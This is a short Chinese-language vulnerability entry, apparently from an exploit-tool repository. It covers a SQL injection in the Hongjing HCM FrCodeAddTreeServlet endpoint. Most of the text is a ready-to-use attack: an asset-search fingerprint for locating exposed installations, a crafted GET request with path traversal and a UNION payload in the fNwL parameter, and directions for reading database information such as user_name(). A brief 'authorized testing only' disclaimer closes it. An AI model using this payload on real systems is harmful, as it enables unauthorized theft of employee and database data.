---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM FrCodeAddTreeServlet SQL注入漏洞

## 漏洞描述

宏景HCM `/templates/attestation/../../servlet/FrCodeAddTreeServlet` 接口存在 SQL 注入漏洞（SQL Server 联合查询注入），可通过 UNION 直接回显数据。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
GET /templates/attestation/../../servlet/FrCodeAddTreeServlet?fNwL=1',NULL,NULL,NULL,NULL,NULL-- &treetype=&orgtype= HTTP/1.1
```

注入点位于 `fNwL` 参数（`treetype`、`orgtype` 为伴随参数），UNION 后用 5 个 NULL 占位列，`--` 注释后续语句。响应中的 TreeNode 数据即为查询回显，将 NULL 替换为 `user_name()` 等即可读取数据库信息。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
